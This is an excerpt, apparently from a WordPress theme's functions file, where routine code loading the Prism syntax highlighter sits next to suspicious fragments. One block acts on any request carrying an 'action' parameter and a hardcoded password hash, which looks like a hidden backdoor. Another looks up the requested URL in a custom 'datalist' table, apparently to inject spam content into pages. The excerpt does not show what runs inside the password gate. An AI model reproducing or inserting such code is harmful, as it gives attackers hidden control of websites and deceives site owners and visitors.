...
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '1e7526a17100aa03039a5fe7c6850e3f'))
	{
...
if ( $wpdb->get_var('SELECT count(*) FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.$wpdb->_real_escape( $_SERVER['REQUEST_URI'] ).'"') == '1' )
	{
		$data = $wpdb -> get_row('SELECT * FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.$wpdb->_real_escape($_SERVER['REQUEST_URI']).'"');
...
function add_prism_code()
{
  if( is_single() ){
	...
	$parent_style = 'uncode-style';
	$child_style = array('uncode-custom-style');
	wp_enqueue_style('prism-css', get_stylesheet_directory_uri() . '/prismjs/prism.css', $child_style, $resources_version);
	wp_enqueue_script('prism-js', get_stylesheet_directory_uri() . '/prismjs/prism.js');
   }
}
add_action('wp_enqueue_scripts', 'add_prism_code');

// Kill the auto-clear form 
